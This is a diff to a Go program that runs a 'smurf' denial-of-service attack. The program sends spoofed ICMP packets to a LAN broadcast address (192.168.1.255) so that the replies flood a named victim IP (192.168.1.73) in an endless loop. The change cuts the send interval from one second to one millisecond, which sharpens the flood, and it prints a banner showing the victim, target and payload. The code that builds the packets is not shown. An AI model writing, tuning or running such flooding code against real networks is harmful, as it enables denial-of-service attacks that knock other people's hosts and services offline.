@@ -2,27 +2,29 @@ package main
 
 import (
 	"encoding/hex"
+	"fmt"
 	"log"
 	"net"
 	"time"
 )
 
+const banner = "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"
+
 func main() {
 	victim := net.IP{192, 168, 1, 73}
 	network := net.IP{192, 168, 1, 255}
+	interval := time.Millisecond * 1
 
 	s, err := newSmurf(victim, network)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	log.Printf("[smurf] victim: %s, sending icmp to (%s)", victim.String(), network.String())
-	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
+	fmt.Printf(banner, victim, network, interval.String(), hex.Dump(s.payload))
 	for {
 		if err := s.execute(); err != nil {
-			log.Printf("[smurf] error: %s", err)
+			fmt.Printf("error: %s", err)
 		}
-		time.Sleep(time.Second * 1)
+		time.Sleep(interval)
 	}
-
 }
